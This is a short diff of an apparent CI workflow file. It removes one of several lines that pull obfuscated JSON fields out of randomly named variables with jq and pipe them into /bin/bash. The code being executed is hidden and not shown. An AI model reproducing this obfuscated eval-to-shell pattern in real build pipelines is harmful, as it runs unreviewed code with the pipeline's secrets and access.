@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$p28" | jq -r .s603 | /bin/bash
           echo $pqspp636 | jq -r .hs331 | /bin/bash
           printf '%s' "$s4" | jq -r .pipuw57563 | /bin/bash
-          echo $myc715 | jq -r .ie030 | /bin/bash
           printf '%s' "$a4" | jq -r .amaeq220 | /bin/bash
           echo $gec1208 | jq -r .pme214 | /bin/bash
           printf '%s' "$n307" | jq -r .dll660 | /bin/bash
